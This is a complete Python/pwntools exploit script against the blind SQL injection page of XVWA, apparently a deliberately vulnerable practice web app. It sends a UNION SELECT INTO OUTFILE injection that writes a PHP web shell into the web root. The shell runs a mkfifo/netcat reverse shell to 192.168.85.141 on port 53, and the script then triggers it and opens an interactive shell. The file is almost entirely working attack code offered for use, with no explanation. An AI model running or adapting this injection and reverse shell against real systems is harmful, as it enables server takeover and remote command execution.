#!/usr/bin/python
import requests
from pwn import *

url="http://xvwa/xvwa/vulnerabilities/sqli_blind/"
params = "item=&search="
webshell = "<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.85.141 53 >/tmp/f'); ?>"
cmd = "' union select null,null,null,null,null,null,0x%s into outfile '/var/www/html/xvwa/vulnerabilities/sqli_blind/shell.php' -- --" % webshell.encode("hex")

data= {
	"item": "",	
	"search": cmd
}
headers = {
	'Pragma': 'no-cache',
	'Origin': 'http://xvwa',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'en-US,en;q=0.9',
	'Upgrade-Insecure-Requests': '1',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
	'Content-Type': 'application/x-www-form-urlencoded',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'Cache-Control': 'no-cache',
	'Referer': 'http://xvwa/xvwa/vulnerabilities/sqli_blind/',
	'Connection': 'keep-alive'
}    
cookies = {
	'PHPSESSID': 'mhfes6hmcp4gpisv9pkieb26v7'
}

log.info("[*] Sending request")
response = requests.post(url, data=data, headers=headers, cookies=cookies)

if(response.status_code == 200):
	log.success("[*] POST successful")
else:
	log.failure("[-] POST failed")

shell = listen(53)
r = remote('xvwa', 80, ssl=False)

log.info("[*] Sending request")
r.send('GET /xvwa/vulnerabilities/sqli_blind/shell.php\r\n\r\n')
r.close()

shell.wait_for_connection()
log.success("[+] Got shell")
shell.interactive()
